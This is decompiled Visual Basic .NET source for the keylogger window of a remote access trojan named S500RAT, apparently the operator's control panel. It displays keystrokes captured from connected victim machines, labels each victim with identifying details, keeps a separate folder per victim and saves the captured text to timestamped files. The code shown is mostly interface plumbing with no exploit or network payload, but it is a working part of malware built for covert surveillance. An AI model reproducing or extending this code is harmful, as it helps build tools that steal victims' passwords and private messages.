Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000022 RID: 34
	<DesignerGenerated()>
	Public Partial Class FormKeylogger
		Inherits Form

		' Token: 0x060005DA RID: 1498 RVA: 0x00032060 File Offset: 0x00030260
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormKeylogger_Load
			AddHandler MyBase.Resize, AddressOf Me.FormKeylogger_Resize
			Me.FormSize = False
			Me.Sb = New StringBuilder()
			Me.InitializeComponent()
		End Sub

		' Token: 0x1700025E RID: 606
		' (get) Token: 0x060005DD RID: 1501 RVA: 0x00032D09 File Offset: 0x00030F09
		' (set) Token: 0x060005DE RID: 1502 RVA: 0x00032D14 File Offset: 0x00030F14
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700025F RID: 607
		' (get) Token: 0x060005DF RID: 1503 RVA: 0x00032D57 File Offset: 0x00030F57
		' (set) Token: 0x060005E0 RID: 1504 RVA: 0x00032D61 File Offset: 0x00030F61
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000260 RID: 608
		' (get) Token: 0x060005E1 RID: 1505 RVA: 0x00032D6A File Offset: 0x00030F6A
		' (set) Token: 0x060005E2 RID: 1506 RVA: 0x00032D74 File Offset: 0x00030F74
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000261 RID: 609
		' (get) Token: 0x060005E3 RID: 1507 RVA: 0x00032D7D File Offset: 0x00030F7D
		' (set) Token: 0x060005E4 RID: 1508 RVA: 0x00032D87 File Offset: 0x00030F87
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000262 RID: 610
		' (get) Token: 0x060005E5 RID: 1509 RVA: 0x00032D90 File Offset: 0x00030F90
		' (set) Token: 0x060005E6 RID: 1510 RVA: 0x00032D9C File Offset: 0x00030F9C
		Friend Overridable Property Search As Guna2TextBox
			<CompilerGenerated()>
			Get
				Return Me._Search
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.Search_KeyDown
				Dim search As Guna2TextBox = Me._Search
				If search IsNot Nothing Then
					RemoveHandler search.KeyDown, value2
				End If
				Me._Search = value
				search = Me._Search
				If search IsNot Nothing Then
					AddHandler search.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x17000263 RID: 611
		' (get) Token: 0x060005E7 RID: 1511 RVA: 0x00032DDF File Offset: 0x00030FDF
		' (set) Token: 0x060005E8 RID: 1512 RVA: 0x00032DEC File Offset: 0x00030FEC
		Public Overridable Property KeyloggerSave As Guna2GradientButton
			<CompilerGenerated()>
			Get
				Return Me._KeyloggerSave
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Guna2GradientButton)
				Dim value2 As EventHandler = AddressOf Me.KeyloggerSave_Click
				Dim keyloggerSave As Guna2GradientButton = Me._KeyloggerSave
				If keyloggerSave IsNot Nothing Then
					RemoveHandler keyloggerSave.Click, value2
				End If
				Me._KeyloggerSave = value
				keyloggerSave = Me._KeyloggerSave
				If keyloggerSave IsNot Nothing Then
					AddHandler keyloggerSave.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000264 RID: 612
		' (get) Token: 0x060005E9 RID: 1513 RVA: 0x00032E2F File Offset: 0x0003102F
		' (set) Token: 0x060005EA RID: 1514 RVA: 0x00032E39 File Offset: 0x00031039
		Public Overridable Property T1 As UIRichTextBox

		' Token: 0x17000265 RID: 613
		' (get) Token: 0x060005EB RID: 1515 RVA: 0x00032E42 File Offset: 0x00031042
		' (set) Token: 0x060005EC RID: 1516 RVA: 0x00032E4C File Offset: 0x0003104C
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000266 RID: 614
		' (get) Token: 0x060005ED RID: 1517 RVA: 0x00032E55 File Offset: 0x00031055
		' (set) Token: 0x060005EE RID: 1518 RVA: 0x00032E5F File Offset: 0x0003105F
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000267 RID: 615
		' (get) Token: 0x060005EF RID: 1519 RVA: 0x00032E68 File Offset: 0x00031068
		' (set) Token: 0x060005F0 RID: 1520 RVA: 0x00032E74 File Offset: 0x00031074
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000268 RID: 616
		' (get) Token: 0x060005F1 RID: 1521 RVA: 0x00032EB7 File Offset: 0x000310B7
		' (set) Token: 0x060005F2 RID: 1522 RVA: 0x00032EC1 File Offset: 0x000310C1
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000269 RID: 617
		' (get) Token: 0x060005F3 RID: 1523 RVA: 0x00032ECA File Offset: 0x000310CA
		' (set) Token: 0x060005F4 RID: 1524 RVA: 0x00032ED4 File Offset: 0x000310D4
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x1700026A RID: 618
		' (get) Token: 0x060005F5 RID: 1525 RVA: 0x00032EDD File Offset: 0x000310DD
		' (set) Token: 0x060005F6 RID: 1526 RVA: 0x00032EE7 File Offset: 0x000310E7
		Public Property Client As Clients

		' Token: 0x1700026B RID: 619
		' (get) Token: 0x060005F7 RID: 1527 RVA: 0x00032EF0 File Offset: 0x000310F0
		' (set) Token: 0x060005F8 RID: 1528 RVA: 0x00032EFA File Offset: 0x000310FA
		Public Property F As FormS500

		' Token: 0x1700026C RID: 620
		' (get) Token: 0x060005F9 RID: 1529 RVA: 0x00032F03 File Offset: 0x00031103
		' (set) Token: 0x060005FA RID: 1530 RVA: 0x00032F0D File Offset: 0x0003110D
		Public Property FullPath As String

		' Token: 0x1700026D RID: 621
		' (get) Token: 0x060005FB RID: 1531 RVA: 0x00032F16 File Offset: 0x00031116
		' (set) Token: 0x060005FC RID: 1532 RVA: 0x00032F20 File Offset: 0x00031120
		Friend Property ParentClient As Clients

		' Token: 0x060005FD RID: 1533 RVA: 0x00032F2C File Offset: 0x0003112C
		Private Sub FormKeylogger_Load(sender As Object, e As EventArgs)
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Dim text As String = Path.Combine(Application.StartupPath, "Clients", "Keylogger\" + Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2)) + "\"
			Dim flag As Boolean = Not Directory.Exists(text)
			If flag Then
				Directory.CreateDirectory(text)
				Me.FullPath = text
			Else
				Me.FullPath = text
			End If
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x060005FE RID: 1534 RVA: 0x00033070 File Offset: 0x00031270
		Private Sub FormKeylogger_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x060005FF RID: 1535 RVA: 0x00033104 File Offset: 0x00031304
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x06000600 RID: 1536 RVA: 0x00033170 File Offset: 0x00031370
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06000601 RID: 1537 RVA: 0x00033188 File Offset: 0x00031388
		Private Sub Search_KeyDown(sender As Object, e As KeyEventArgs)
			Me.T1.SelectionStart = 0
			Me.T1.SelectAll()
			Me.T1.SelectionBackColor = Color.FromArgb(7, 11, 48)
			Dim flag As Boolean = e.KeyData = Keys.[Return] AndAlso Not String.IsNullOrWhiteSpace(Me.Search.Text)
			If flag Then
				Dim num As Integer
				For i As Integer = 0 To Me.T1.TextLength - 1
					num = Me.T1.Find(Me.Search.Text, i, RichTextBoxFinds.None)
					Dim flag2 As Boolean = num <> -1
					If Not flag2 Then
						Exit For
					End If
					Me.T1.SelectionStart = num
					Me.T1.SelectionLength = Me.Search.Text.Length
					Me.T1.SelectionBackColor = Color.LimeGreen
				Next
			End If
		End Sub

		' Token: 0x06000602 RID: 1538 RVA: 0x00033284 File Offset: 0x00031484
		Private Sub KeyloggerSave_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Directory.Exists(Me.FullPath)
				If flag Then
					Directory.CreateDirectory(Me.FullPath)
				End If
				File.WriteAllText(Me.FullPath + String.Format("\\Keylogger_{0:MM-dd-yyyy HH;mm;ss}.txt", DateTime.Now), Me.T1.Text.Replace(vbLf, Environment.NewLine))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x040002B8 RID: 696
		Private FormSize As Boolean

		' Token: 0x040002B9 RID: 697
		Public Sb As StringBuilder
	End Class
End Namespace
